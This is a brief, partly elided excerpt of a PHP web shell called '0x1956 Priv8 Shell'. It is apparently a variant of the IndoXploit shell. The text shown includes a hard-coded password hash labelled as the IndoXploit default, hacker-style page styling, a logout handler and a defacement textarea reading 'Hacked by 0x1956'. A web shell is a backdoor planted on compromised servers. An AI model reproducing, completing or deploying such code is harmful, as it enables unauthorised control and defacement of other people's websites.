...
$auth_pass = "d4ddef9114474b25f80603d79b9b7634"; // default: IndoXploit
$color = "#00ff00";
...
<html>
<head>
<title>0x1956 Priv8 Shell</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
if($_GET['logout'] == true) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by 0x1956</textarea><br>
